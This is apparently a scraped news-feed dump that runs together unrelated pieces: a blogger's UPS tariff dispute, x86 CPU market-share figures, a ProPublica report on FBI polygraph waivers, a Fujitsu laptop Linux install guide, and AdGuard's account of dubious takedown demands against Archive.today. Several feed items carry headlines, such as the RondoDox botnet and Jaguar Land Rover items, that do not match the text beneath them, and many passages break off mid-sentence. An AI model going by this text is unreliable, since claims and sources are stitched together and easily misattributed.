The UPS shipping agent had indicated the parcel was subject to Section 232 tariffs on steel and aluminum, which required me to fill out a UPS-specific form attesting to the steel and aluminum content of the package. (This is an important distinction because Section 232 is not currently part of the present matter before the U.S. Supreme Court (PDF), only reciprocal tariffs under the IEEPA.) There should be little or no aluminum in these because the board and traces would be copper. However, a PCI card is probably going to have a steel bracket, so I looked at the typical mass for those and picked a sufficiently high number of 149g, almost certainly an overestimate but that's always safest with this stuff, then looked at the spot price of stainless steel and based on that weight computed a steel content value of $0.48. I marked "not applicable" for everything else and sent it back. They accepted that.

In the background, all this goes into a U.S. Customs and Border Protection Form 7501, also known as an Entry Summary. It is important to realize that in this circumstance, with UPS as the broker, you are  actually the importer of record — they are. You are the "ultimate consignee." Based on the information provided and the judgement of the broker's agent, then a tariff is assigned and added to the paperwork, which is "assessed" by CBP but in practice is being assessed by the broker based on what they expect CBP would charge under current regulation. Ordinarily you don't see this form. CBP does spot-check these but the majority just go through. Since UPS is the importer in this situation, they also pay the tariff they computed "in advance" to clear customs, and then they charge you for that plus their broker fee.

It took several more days for the actual tariff bill to arrive, which was early Monday morning. Now, the initial E-mail said this:



Yes, the initial bill was for US$711. When I logged in, however, it gave me a total of $698 because it hadn't yet been delivered, which included a $14 brokerage fee.



Time was of the essence, however, because it was arriving . I was absolutely incandescent to have to do it, but I paid the entire charge in full on the spot, and this is  The last thing you want is for your package to get redirected to a warehouse pending your payment, because any shipper will start tacking on storage fees and they have no incentive to get it out of storage quickly. For UPS, a direct quote from their own agents, "Warehouse charges will be added on shipments that are held in our warehouse over two business days at a rate of $20.00 per day and $0.04 per pound. ... On the 15th day, all shipments will be eligible for General Order warehousing by U.S. Customs. Any shipment moved to a G.O. warehouse will be assigned additional warehouse fees over and above any UPS warehouse fees. If imposed, these fees must be paid in full before the shipment can be removed." Obviously I wanted no part of that.

After I had been advised by the system the package would be delivered as scheduled, I then relentlessly abused the AI chatbot on UPS' home page until it asked for my phone number and I got a callback into their phone support line. The first person on the line advised me they didn't handle tariffs and transferred me to another department, after which I spent (not an exaggeration) 45 minutes on hold until it was answered. This new agent said that this was dealt with through a specific subgroup on the UPS post entry team that didn't do anything by phone. (These brokerage teams generally operate out of the Kentucky UPS Worldport hub at Louisville Muhammad Ali International Airport, formerly Standiford Field, hence its IATA code of SDF that also turns up in UPS documentation.) He gave me an E-mail address that looked like line noise but I confirmed it twice with him and also that I had to put the tracking number into the subject line with the magic words "Disputing Duties and Custom Charges." I indicated in the message the fees were paid but that I believed they were unreasonable and incorrect, and also pointed out I submitted the Section 232 paperwork when requested.

It took a day to get a reply, then came the United States Veterans' Day holiday, and finally I heard back yesterday from a second agent that they had "corrected this shipment." What they had done was file an amended Form 7501 and this 7501 they actually sent me so I could see the results. The declared value was changed to US$342 (I presume a difference in the spot exchange rate at the time of filing) and now it had two HTSUS numbers. The entire $342 was attributed to 8473.30.2000, a slightly different code for "Parts and accessories, including face plates and lock latches, of printed circuit assemblies" which might be referring to the bracket I declared in the Section 232 form. There was no tariff on this ("FREE"). However, a second code 9903.02.20 was added, a long-winded way of saying a tariff (in this case 15%) on "articles the product of the European Union." This was $51.30 and the final tariff.

Everything arrived safely, by the way, and in excellent condition (though I cracked open the antistatic bag on the ANS board to take off the Maxell battery which Apple always shipped logic boards with back then). However, I would like to point out for the sake of accuracy that the ANS logic board, ROM SIMM and cache DIMM have no country of origin printed on them. Only the Twin Turbo card does, and it says ...



.. but since it wasn't the major part of the order it seemed like I'd be wasting even more time over ten or fifteen bucks to appeal this too. Your mileage and motivation may vary.

Now that UPS was into me for $632.70, the revising agent said, "Any difference between the amount paid and the amount now reflected will be auto-refunded to you. Most of the time, this is done by check sent to the billing address, you can expect this between 2-6 weeks." They didn't say when they don't use a check (I paid with a credit card), but they did give me a phone number for accounting, which I'll call if UPS fails to pay back this particular interest-free loan.

So that's the sordid tale. Even though UPS (mostly) made this right, I'm still unhappy with them for screwing up so badly in the first place because I'm out the money until they get around to reimbursing me. You'd think someone would have noticed that a thumping big duty like that seemed a little weird for a transaction of this size and maybe called a supervisor or something. The fact it could be so promptly appealed — and reversed in a few days, something that hardly ever happens with the federal government — pretty much demonstrates it was their call to ding it for that much in duty in the first place. I'm also unhappy with them for only alerting me to the final cost of the tariff when the shipment was inbound and due for delivery instead of earlier when it was assessed, because they have you over a barrel at that point unless you want to take your chances with their brokerage warehouse. This obviously nets them more money with the people who won't pay up immediately, but it's undeniably pretty bad customer service. Unfortunately, my unscientific survey of reports in the UPS Reddit indicate I am far from the only person to get a disproportionate assessment of this type.

Regardless, if this happens to you — whether it's FedEx or DHL or UPS or whatever —  and  appeal it. Don't let your shipment go to a warehouse and don't bounce it back to the sender; since odds are the shipper (because they are likely the importer of record) has already paid the duty, they're going to want their money back and you'll be out the money  the items. But, by golly, appeal it: just because you might agree with it politically doesn't mean they did it right.

Intel is holding strong, and as its latest offerings for client and server systems got significantly more competitive than they were several quarters ago, the pace of AMD's gains has slowed down considerably. However, during the quarter, AMD achieved two important milestones: it now commands shipments of over 25% of all x86 CPUs, and it now ships over 33% (one-third) of desktop x86 CPUs.Normally, we start our coverage of the x86 market based on data from Mercury Research with client CPUs, but the third quarter was very unusual as unit shipments of x86 CPUs were flat quarter-over-quarter (QoQ), which significantly contradicts the normal seasonal bump when PC makers start to prep for the back-to-school (BTS) season in June – July as well as Christmas season in September.Indeed, PC and server makers increased their CPU procurements in Q3, but the weakness came almost entirely from Intel, which saw sharp drops in IoT/SoC and entry-level mobile processors as it shifted manufacturing capacity toward server processors, and strong shipments of such parts in Q2. By contrast, AMD's unit shipments were flat to slightly up, so the company gained share sequentially and year-over-year (YoY), hitting two psychologically important milestones.For the first time in years, AMD's unit share of all x86 client and server CPUs shipped exceeded 25% and now stands at 25.6%, up from 24.2% in the prior quarter and up from 24% in the same quarter a year ago. Intel still commands 74.4%, but it lost some share in certain segments, allowing AMD to hit an important milestone amid a market shrink.If we add embedded, IoT, and game consoles SoCs to the equation, then AMD's share looks even more impressive: a 30.9% share of all x86-based chips, up from 25% in the third quarter of 2024. While Intel maintains its dominant position with 69.1%, its 5.9% YoY share loss does not look very good. Yet, it should be noted that AMD shipped significantly more game console SoCs in the third quarter this year compared to the third quarter of 2024, which inflated its results a bit.Client CPUs: AMD maintains market shareStrong desktop and mobile CPU lineups as well as Intel struggles with supply of small-core mobile CPUs and prior-generation desktop offerings allowed AMD to slightly outgrow Intel in the third quarter both sequentially and year-over-year, according to data from Mercury Research.AMD's client unit share rose to 25.4%, up 1.5% QoQ and 1.4% YoY, driven mainly by strong desktop momentum. By contrast, Intel's share fell to 74.6%, down 1.5% sequentially and 1.4% compared to the same quarter a year ago, as its entry-level mobile shipments were constrained by reduced small-core CPU supply. Although Intel still dominates in total volume, Q3's numbers reflect the ongoing pressure on its mobile PC shipments and AMD's sustained improvement in desktops.Desktop CPUs: Another great quarter for AMDBoth AMD and Intel saw strong sequential unit shipments growth in Q3 2025 on the desktop CPU market, although Q2 -> Q3 market growth in general was lower than normal seasonal rates, according to Mercury Research.AMD grew far faster thanks to the popularity of its Ryzen 9000-series 'Granite Ridge' CPUs in the enthusiast and performance tiers, allowing the company to reach another all-time high: a 33.6% share of the desktop PC market, up from 32.2% in the prior quarter and a gain of 5.2% year-over-year. If we compare AMD's current share to its share in the second quarter of 2024, the gain would be a whopping 10.6%Intel still held the majority of desktop shipments, but its share fell from 67.8% to 66.4% QoQ, and from 71.7% YoY, reflecting AMD’s continued gains in both the mainstream and high-end segments and shortages of Intel's 13th and 14th Core 'Raptor Lake' processors that are still popular three years after their original release in 2022.On the revenue front, AMD reached another record quarter for desktop CPU revenue, driven by higher shipments and a strong mix of premium SKUs, as the company noted in its conference call a week ago. Intel's revenue position weakened as its unit share declined and AMD absorbed more of the market's high-margin demand. Mercury Research notes that AMD's revenue growth in desktops significantly outpaced its unit growth, which confirms that the red company continued to strengthen its position in the most profitable parts of the desktop market.Mobile CPUs: AMD starts to regain shareAMD lost market share to Intel in the mobile CPU space in Q1 and Q2 2025, but the company outperformed Intel in Q3 2025 on a sequential basis, gaining unit share as Intel struggled with reduced shipments of its entry-level small-core processors.AMD's mobile CPU unit share rose from 20.6% in Q2 to 21.9% in Q3, a sequential gain of 1.4%, while Intel's share fell from 79.4% to 78.1%, down 1.4% QoQ. Intel did manage to grow shipments slightly, but well below normal seasonal levels, allowing AMD to capture market share during the quarter, according to Mercury Research. Nonetheless, AMD lost 0.4% market share year-over-year, whereas Intel gained 0.4%.On the revenue side, the mix probably favored both companies but helped AMD more. Intel's shortage of low-end CPUs pushed its average selling prices upward, while AMD — which does not have direct rivals for Intel Atom-like SoCs — benefited from increased shipments of mid-range and premium Ryzen mobile processors as Intel faced some shortages on this side of the spectrum as well.Server CPUs: AMD stagnates amid product mix improvementIn the server CPU market, Q3 2025 saw relatively flat unit shipments overall, but while AMD managed to edge out another small gain, its gains have been negligible this year. Then again, although the sequential movement was modest, it continued the longer-term trend of AMD steadily expanding its presence in x86 servers.AMD's server unit share increased from 27.3% in Q2 to 27.8% in Q3, while Intel's share slipped 0.5% to 72.2%. Both companies saw YoY shipment growth, but AMD's increase was stronger, helping it push unit share higher compared to the same quarter a year earlier, so overall things look good for AMD.Most of the real action in Q3 came from product mix rather than volume, according to Mercury. AMD's EPYC 'Turin' ramp accelerated, driving stronger demand for high-core-count EPYC processors, while Intel saw increasing adoption of Xeon 6 'Granite Rapids,' which helped lift its average selling prices despite slightly lower unit volumes.On the revenue side, AMD hit another all-time high, as the mix shifted heavily toward its latest and more expensive EPYC 9005-series platform. The combination of flat unit shipments and rising prices meant that AMD's server revenue continues to grow significantly faster than its unit share, while Intel's revenue gains were more limited due to modest declines in its overall shipment mix.In terms of unit share, AMD continued to gain ground in Q3 2025 across nearly all major x86 segments, helped by strong desktop growth driven by the halo effect of range-topping Ryzen 9000-series CPUs and Intel's struggles to ship enough previous-generation desktop CPUs, as well as the relatively low popularity of its latest offerings for desktops. As a result, AMD expanded its presence in client CPUs, reached a new high in desktops, and inched upward in servers, while Intel's share declined modestly as supply constraints and product transitions limited its ability to address all orders. Although Intel still led the market in total shipments, the balance continued shifting gradually toward AMD.In terms of revenue, AMD delivered even stronger results, setting new highs in both desktop and server segments thanks to rising sales of premium processors and the ramp of its newest platforms. Intel's revenue performance was more mixed: constrained low-end supply pushed its average prices higher, but it ceded more of the high-margin market to AMD, especially in desktops and enterprise servers. Then again, the company announced price hikes of its popular Raptor Lake processors, which will impact its results in Q4.]]></content:encoded></item><item><title>NPMScan - Malicious NPM Package Detection &amp; Security Scanner</title><link>https://npmscan.com/</link><author>/u/kryakrya_it</author><category>netsec</category><pubDate>Sat, 15 Nov 2025 20:14:40 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[ stolen through malicious npm packages.Don't be the next victim.

The deputy director receives some of the country’s most closely held secrets, including the President’s Daily Brief, which also contains intelligence from the CIA and the National Security Agency.People familiar with the matter say his ascent to that position without passing a standard FBI background check was unprecedented. ProPublica spoke with four people familiar with the polygraph issues, who spoke on the condition of anonymity for fear of retaliation and because they were not authorized to publicly discuss the details of FBI background checks.Bongino was selected for the role at the FBI although he, like Patel, had no prior experience at the bureau. Bongino had previously served in the Secret Service and worked as a New York City police officer. But he later gained millions of fans and followers in conservative circles for television and podcast appearances, having taken over Rush Limbaugh’s spot on numerous radio stations. Over the years, Bongino used those platforms to push conspiracy theories about the 2020 election and professed his allegiance to President Donald Trump while railing against the agency he now helps lead.He’s had a rocky tenure so far, marked by public fights with senior Cabinet officials and accusations that he leaked information to the press, which Bongino denied. In August, Trump appointed Missouri Attorney General Andrew Bailey as co-deputy director at the FBI, setting off speculation that the White House had lost faith in Bongino. But he remains in the job.ProPublica could not determine whether Bongino sat for a polygraph exam or what its results were. Though the existence of a polygraph waiver is an indication he may not have passed the test, it is possible Bongino received a preemptive exemption, a former senior FBI official with knowledge of the vetting program told ProPublica.When ProPublica sought comment from the FBI, the agency denied that Bongino or the other senior staff members failed polygraph tests. “It is  that the individuals you referenced failed polygraphs,” wrote spokesperson Ben Williamson.He added: “The FBI follows all laws and procedures on personnel security measures, and any implication otherwise is false. Furthermore, while the FBI does not comment on confidential security information, particularly in matters of personnel, this article is riddled with falsehoods — it misrepresents polygraph protocol, inaccurately portrays FBI security measures, and makes multiple false claims about FBI employees who have done nothing wrong.”ProPublica asked the FBI to specify what it considered to be false. The agency did not reply.A polygraph exam is not technically pass or fail, but a person is not cleared for approval if the examiner finds deception or is unable to reach a conclusion about the veracity of the answers given. Officials said that a person may not have technically failed the exams; the results could be deemed inconclusive, which would not meet the FBI’s standards for hiring or security clearances.The FBI spokesperson initially said the three officials are so-called Schedule C — a category reserved for political appointees. He said the status would mean they were “not required” to undergo polygraphs. But Daniel Meyer, a former executive director for the Inspector General of the Intelligence Community External Review Panel, told ProPublica that an FBI employee wouldn’t be excluded from taking a polygraph exam simply because they’re a Schedule C employee. Three other lawyers, who specialize in national security matters, said the same.In fact, the FBI’s employment eligibility guidelines say all employees must obtain a “Top Secret” clearance in order to work at the agency following a background check. “The preliminary employment requirements include a polygraph examination,” the guidelines say.Former FBI officials said they could not recall a single instance in which a senior official like Bongino received a waiver and was then given a top secret clearance. One said they were only aware of one waiver being issued in a seven-year period under Director Christopher Wray, for an outside subject matter expert whose polygraph results were inconclusive.Two other officials, Marshall Yates, the agency’s liaison with Congress, and Nicole Rucker, Patel’s personal assistant, did not clear their polygraph exam and were granted waivers by Patel that allowed them to get a high-level security clearance, said officials with knowledge of the issue. Neither of their roles is as high-profile as Bongino’s, nor does either one have prior FBI experience.Polygraph examiners ask a standard list of questions about drug use, criminal history, foreign contacts and mishandling of classified information. After the exam, an analyst scrutinizes the results and decides whether or not they indicate deception or are inconclusive. Those whose answers are determined to be inconclusive are given another chance to take the test the following day.“I don’t know of anybody in my time that were in those senior roles that failed polygraphs, and most of us had taken multiple polygraphs,” said Bob Anderson, a former FBI executive who ran the counterintelligence division and retired in 2016. “If somebody would fail those polygraphs in my time, most likely they would be removed out of the classified environment until that could get cleared.”This year, an employee within the FBI’s Security Division filed a formal complaint alleging the waivers violated agency policy. The Security Division conducts employee polygraph exams and evaluates their results. Its mission is to protect the FBI from leaks of classified information and infiltration by foreign spies. The employee filed the complaint with the division director, Robert Turner, a 22-year veteran of the bureau who previously held roles in counterterrorism and counterespionage.A complaint about the waivers was also shared with the Department of Justice’s Office of the Inspector General, sources said.According to her resume, Rucker, 40, has served as an assistant to Stephen Miller, the powerful architect of the administration’s immigration crackdown, since January 2020.Rucker would have detailed insight into day-to-day FBI operations and those meeting within the director’s office. She also assists in planning Patel’s travel, a former FBI official familiar with her job responsibilities said.The White House said Rucker is not sharing information on the FBI’s operations with Miller and referred further questions to the bureau and the Department of Justice.Meanwhile Yates, 37, was previously the executive director of the Election Integrity Network, a group that worked to overturn the results of the 2020 election. Yates, as the top liaison between the bureau and Congress, has wide visibility into the workforce, including some access to internal files about past investigations.Historically, the job was staffed by a nonpartisan career FBI or Department of Justice official with deep knowledge of the bureau. Among other tasks, the official organizes closed-door briefings with lawmakers to discuss active, undisclosed threats to the country.While an FBI spokesperson discussed the polygraph issues with ProPublica, Patel, Bongino, Yates, Rucker and Turner did not respond to direct requests for comment.Sen. Dick Durbin, the Democratic ranking member of the Senate Judiciary Committee, raised the issue of senior FBI leadership not passing polygraphs — without identifying any individuals — when Patel testified before the committee in September.“As I understand it from highly credible sources, key members of Director Patel’s senior executive team and others on the seventh floor had disqualifying alerts on their initial polygraph exams,” Durbin said. “How did they survive? They survived because of a personal waiver by either the director or the attorney general to remain employed by the bureau.”When Durbin asked Patel if anyone on his senior executive team received “disqualifying alerts on their polygraphs,” Patel refused to answer. And when the senator followed up by asking if he or Attorney General Pam Bondi granted a waiver, Patel replied, “I have to get back to you.”The FBI did not respond to the committee on questions concerning polygraphs, according to a person familiar with the matter.Durbin, in a statement to ProPublica, said, “Reports of disqualifying alerts on polygraphs by senior FBI officials — which require personal waivers from the highest levels of leadership to remain employed — are deeply alarming.”The polygraph exam uses a device strapped to a subject’s body to measure physiological responses like heart rate, blood pressure and perspiration as the person answers yes-or-no questions. Though the device’s efficacy is debated, it is routinely used in America’s law enforcement and intelligence agencies to screen potential employees and conduct leak investigations. The FBI first began requiring the polygraph exam for all applicants in 1994, according to a 2006 report by the Department of Justice’s Office of the Inspector General.They are used as part of a broader background check conducted on all potential FBI employees to determine if the applicant triggers any national security or suitability concerns. Suitability refers to a candidate’s criminal history, drug use or other issues that would prevent them from becoming employees of a federal law enforcement agency.FBI security measures are designed to protect sensitive intelligence sources and information, and the screening is intended to ensure that officials given access to this information have cleared a thorough vetting process.Staff who work in the director’s office on the seventh floor of the J. Edgar Hoover Building in Washington must also obtain an additional clearance called SCI, or sensitive compartmented information.SCI contains some of America’s most sensitive intelligence secrets, and employees with that clearance are “read-in” to various compartments or programs. Bongino, Yates and Rucker all obtained SCI clearances after being granted the waivers, people familiar with their clearance level said.In addition to bringing on loyalists, the administration has launched a purge of career FBI staff since January. More than 50 bureau officials have been fired or pushed out, a ProPublica analysis found. They include executives with decades of counterterrorism and intelligence experience, as well as line agents assigned to work on politically sensitive criminal probes, including investigations into Jan. 6 rioters and Trump.Patel has justified these firings under Article II of the Constitution, which outlines the president’s powers over government — a novel use of the statute that is being challenged in the courts. Publicly, the administration has suggested some fired agents were involved in misconduct while investigating Trump or his allies.Former acting FBI Director Brian Driscoll sued Patel, Bondi and the bureau in September, saying he was subjected to political loyalty tests and illegally fired. The FBI declined to comment when the suit was filed and federal agencies have yet to respond in court.The FBI has recently used the polygraph to ask senior employees if they have said anything negative about Patel or had spoken to the media, multiple former FBI employees said. The New York Times earlier reported the use of polygraphs to investigate negative comments about Patel.Destined for Something GreaterA lawyer by training, Yates has been the point person in responding to inquiries from Senate Judiciary Chairman Chuck Grassley, a Republican who for months has been publishing internal FBI documents, which he contends show improper past investigations into Trump. According to a former senior FBI official, Yates called regional bureau field offices early this year to get lists of employees involved in cases against Trump; several of those agents were later fired by Patel.Originally from Alabama, Yates previously worked as chief of staff for former Rep. Mo Brooks, R-Ala., and was counsel to Rep. Thomas Massie, R-Ky. A Democratic representative accused Brooks of inciting rioters on Jan. 6, which Brooks denied; the civil case was later dismissed. Brooks has described the FBI as “partisan hacks.” Massie wrote on social media this month, “Capitol Police turned CIA orchestrated the pipe bombs on January 6th, and the FBI has covered it up.”Little is known about Nicole Rucker, who spells her name online as Nikole. Multiple sources have described Rucker as Patel’s personal assistant. She joined Patel on a recent foreign trip to London, where she sat in on a sensitive meeting with a Western intelligence ally, according to a knowledgeable source.Rucker arrived at the FBI on Jan. 20 and began working in the director’s suite without a security clearance, according to a former FBI employee familiar with her work.Due to her initial lack of clearance, Rucker was escorted from the FBI lobby to the secure director’s suite by Turner, who was then the deputy of the FBI’s Security Division. Rucker eventually obtained a security clearance and was no longer escorted, the person said.Williamson, the FBI spokesperson, said “people are escorted in similar circumstances all the time.”In May, Rucker’s husband posted a photo on LinkedIn with himself and Rucker alongside Patel, standing in front of the FBI logo.On her resume, she also lists a job working as the executive assistant to the chief of public affairs at the National Museum of African American History and Culture from 2018 to 2019. After that, she was a congressional relations liaison at Ultra Electronics, a British defense contractor.Rucker founded Cobblestone Concierge, which offers personal assistant services such as “home management, organization, errand service and so much more!” according to her LinkedIn profile. The company’s website says its services include “household management (including meeting the cable guy).”ProPublica interviewed her ex-husband, Joseph Churchville, who said Rucker worked at a title insurance company while they were married but had always thought she was destined for something greater. “She’s tenacious. When she acquires something that she wants, she has the ability to make things happen,” Churchville said.]]></content:encoded></item><item><title>Windhawk Windows classic theme mod for Windows 11</title><link>https://windhawk.net/mods/classic-theme-enable</link><author>znpy</author><category>dev</category><pubDate>Sat, 15 Nov 2025 16:53:30 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>RondoDox Exploits Unpatched XWiki Servers to Pull More Devices Into Its Botnet</title><link>https://thehackernews.com/2025/11/rondodox-exploits-unpatched-xwiki.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi9TCTqd165bW145DBMR-qSAvHA1l2PjOb-YZw0aprmzJb9_qRQsz0ZNFZ6zsnvEDcsv4bMnOJcAUYTiBKOrbVuXOROUZ1ZG7imQnFIp6QouU3F5gG2i_pHkCiDW2khhHHdVN2Ey-0_vDrdtB4AXyArktjeo6JLpAUowA2Lux2AHUarBJTHjcKS3lXz60e4/s1600/botnet.jpg" length="" type=""/><pubDate>Sat, 15 Nov 2025 16:35:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[The botnet malware known as RondoDox has been observed targeting unpatched XWiki instances against a critical security flaw that could allow attackers to achieve arbitrary code execution.

U729. The tl;dr is that it’s a delightful laptop, and Linux runs
flawlessly, and all the hardware things I’ve needed run OOTB. The only
difficulty I had was in disabling Secure Boot, but I figured out how to do it,
which I explain below.From early 2024 my daily driver was an M2 MacBook Air, until earlier this year I
broke the screen, and the repair was quoted at almost 1000 AUD. Since I used it
as a desktop most of the time, this didn’t affect me much. After some
flip-flopping I decided to get an M4 Mac mini. Partly for the faster CPU and
more RAM, but partly because I liked the idea of LARPing like it’s the 2000s,
when computers, and by extension the Internet, where fixed in physical space,
rather than following everyone around.Of course this was a terrible idea. I had three working computers—a
Linux+Windows desktop, a Mac Mini, and a MacBook Air that I could use as a
desktop—and none of them were portable. When I went to RustForge 2025 I
just brought my phone. If I wanted to travel, even within Sydney, to a demo
night or math club or some such, I didn’t have a laptop to bring with me.So I needed a new laptop. And the Tahoe release of macOS was so ugly
(see e.g. 1, 2, 3) it made me boot up the old Linux
desktop, and start playing around with NixOS again. And I fell in love
with Linux again: with the tinkering and the experimentation and the freedom it
affords you.So, I wanted a Linux laptop. I had a ThinkPad X1 some years ago and it was
terribly: flimsy plastic build and hardware that vastly underperformed its
price. I looked around for old, refursbished workstation laptops, and, randomly,
I ran into an eBay seller offering a refurbished Fujitsu laptop.The specs/price ratio was pretty good: 16 GiB of RAM and 512GiB of SSD, all for
250 AUD. And it was 12in and 1.1kg, which I like: laptops should be small and
lightweight. But the thing that got me, in all honesty, was the brand. “Fujitsu
laptop” sounds like colour in a William Gibson novel: “crawling into the
avionics bay, Case took out a battered Fujitsu refurb, and stuck a JTAG port in
the flight computer—”. I already use NixOS and a trackball and a
mechanical keyboard, so a laptop that’s even more obscure than a
ThinkPad is perfect for me. And it was only 250 AUD. So I got it.The only problem I had was disabling Secure Boot in order to install
Linux. Otherwise: I love it. It’s small and lightweight, feels solid, the
keyboard is good, all the hardware works out of the box with NixOS, and the
battery life is pretty good.This section describes the problems I encountered.I tried to install Linux the usual way, when I was greeted by this:Going into the BIOS, the option to disable Secure Boot was greyed out. I
tried a bunch of random bullshit: wiping the TPM, disabling the TPM. That didn’t
work.First, install Windows 11. This came with the laptop. And the installation makes
installing Linux feel easy: I had to do so many weird tricks to avoid having to
create an account with Microsoft during the installation.Once Windows is installed, go into Windows Update. Under “Advanced Options >
Optional Updates”, there should be an option to install Fujitsu-specific
drivers. Install those. And for good measure, do a general Windows update.There should be a program called DeskUpdate on the Desktop. This is the Fujitsu
BIOS update tool. Run this and go through the instructions: this should update
the BIOS (the ordering seems to be important: first update the Fujitsu firmware
through Windows Update, then the BIOS through DeskUpdate).Reboot and go into the BIOS (F2). You should have a new BIOS version. In my
case, I went from BIOS 2.17 to 2.31 which was released on 2025-03-28:You now have the option to disable Secure Boot:After this, I was able to install NixOS from a live USB:The laptop comes with this corporate spyware thing called Absolute
Persistence. It’s some anti-theft tracking device. Since the Lifebook is
typically an enterprise laptop, it makes sense that it comes with this type of
thing.I only noticed this because I was searching the BIOS thoroughly for a way to
disable Secure Boot. The good news is disabling it is pretty straightforward:
you just disable it in the BIOS.As I understand it, Absolute Persistence requires an agent running in the OS, so
the BIOS support, by itself, doesn’t do anything once disabled.The following work flawlessly OOTB:Touchscreen (I didn’t realize the screen was actually a touchscreen until I
touched it by accident and saw the mouse move)Webcam (not winning any awards on quality, but it works)Things I have not tested:To enter the BIOS: smash  until you hear the beep. No need to hold down the
 key.To enter the boot menu: as above but with .]]></content:encoded></item><item><title>Jaguar Land Rover cyberattack cost the company over $220 million</title><link>https://www.bleepingcomputer.com/news/security/jaguar-land-rover-cyberattack-cost-the-company-over-220-million/</link><author>Bill Toulas</author><category>security</category><pubDate>Sat, 15 Nov 2025 15:09:19 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Jaguar Land Rover (JLR) published its financial results for July 1 to September 30, warning that the cost of a recent cyberattack totaled £196 million ($220 million) in the quarter.

The agency issued a subpoena to the site’s domain registrar, asking for information about the person behind it, citing a “federal criminal investigation.”Archive.is was launched in 2012 by someone using the name  — though whether that’s their real identity remains unclear. The site lets users save “snapshots” of web pages by submitting URLs, which makes it a valuable tool for preserving content that might otherwise disappear. But because it can also be used to bypass paywalls, it’s long been a thorn in the side of many media organizations.While the exact nature of the FBI investigation hasn’t been confirmed, it is speculated it can be related to copyright or CSAM (child sexual abuse material) dissemination issues. Altogether, the situation suggests growing pressure on whoever runs Archive.is, and on intermediaries that help make its service accessible. AdGuard DNS, as it turns out, may have just become one such pressure point.A few weeks ago, we were contacted by a representative of an organization called the Web Abuse Association Defense, a French group claiming to fight against child pornography. Their website is webabusedefense.com, and here is the archived version as of November 7.They demanded that we block the domain  (and its mirrors) in AdGuard DNS, alleging that the site’s admin had refused to remove illegal content since 2023. To be clear, Archive.today allows users to take “snapshots” of any webpages, including potentially illegal material. In such cases, it’s the site admin’s job to respond to complaints and promptly remove that content.This struck us as strange — we’re not a hosting provider, and it seemed unusual for an infrastructure-level service like ours to be asked to take action like this.Soon after, the situation escalated into what we could only describe as direct threats:We won’t share all the screenshots here, but there were several similar messages.We sought legal advice, and unfortunately discovered that French law, specifically Article 6-I-7 of the Loi pour la Confiance dans l'Économie Numérique (LCEN), might actually require us to respond and apply blocking measures, at least for French users.That said, this whole situation shows just how inadequate this regulation is. Such decisions should be made by a court — a private company shouldn’t have to decide what counts as “illegal” content under threat of legal action.Even so, the story didn’t quite add up. Since someone was trying to pressure us into taking action, we decided to contact the other side, Archive.today, directly.We sent an email to Archive.today’s contact address and asked two simple questions:Can they remove the illegal content from the URLs we were informed about?Is it true that they refused to remove such content in the past, and had they been notified about it before?They replied within a few hours. The response was straightforward: the illegal content would be removed (and we verified that it was), and they had  received any previous notifications about those URLs.Moreover, they hinted that Archive.today had been targeted by a campaign of “serial” complaints, supposedly from French organizations, sent to various companies and institutions that could potentially harm the site. They even shared a link demonstrating a complaint similar to the one we had received.At that point, things were looking increasingly odd, so we decided to dig deeper into the “complainant.”The Web Abuse Association Defense website references several well-known organizations — Europol, OFAC, NCA — yet provides no details or evidence of any cooperation with them.The association itself was registered in February–March 2025, around the same time its website appeared. There is very little public information about it. Interestingly, registering an association in France can apparently be done entirely online and does not require proof of identity.The association is registered at an address used for mass company registration, which isn’t inherently problematic but it does indicate that the entire registration process could have been carried out online by a single person.Its Twitter/X account appeared only recently — in August 2025. It has just four followers, and its feed consists of just a few reposts.None of this proves anything by itself, but something still doesn’t add up. In their first email, the “head” of the association claimed that their correspondence with Archive.today started with a bailiff report from 2023. That timeline simply doesn’t fit.We examined the so-called “bailiff reports” they had sent us as evidence. It’s important to note that these aren’t bailiff reports in the English sense — they’re “constat d’huissier sur Internet,” official records of online content such as webpages, posts, or videos. These particular reports were ordered online via the service called Qualijuris, and, based on the timestamps, most of them were also created in August 2025 — not 2023.Only two of these bailiff reports were ordered in 2023 from a similar service. What’s interesting is that they weren’t ordered by WAAD. The name of the person who ordered these bailiff reports matches the name that appears in the correspondence shared with us by the Archive.today administrator — the same one he wrote about on X in 2024. In that case, the complaint appeared to come from a real lawyer — but someone had registered a domain with the lawyer’s surname, containing nothing but a redirect to the lawyer’s actual website, and did it on the same day the complaint was sent. The domain was used solely to send the emails and it is not active anymore. Interestingly, that email also invoked the LCEN law.So what is the link between WAAD and that lawyer from before? Are these bailiff reports real and could it be that this is a case of impersonation of a real person? We don’t know yet, but we hope to discover the truth soon enough.Unfortunately, we couldn’t dig any deeper about who exactly is behind WAAD. The domain  is registered with , but ownership information (including historical records) is hidden. They use ProtonMail for email, so that’s another dead end. The site itself is behind Cloudflare, making further tracing impossible.With everything said and done, here’s where things stand now:The illegal content was promptly removed from Archive.today after we notified them.The complaints against the site look extremely suspicious. In our case, they came from an organization that was only recently registered that seems deliberately set up to hide the identities of those behind it.The sample complaint shared by Archive.today’s admin shows signs of impersonating a real person. We have contacted the person in question and are currently waiting for a reply.In both our case and that other example, the recipients were pressured to act under the French LCEN law. However, that same law also provides penalties for false reports:
Art. 6-I-4 LCEN:
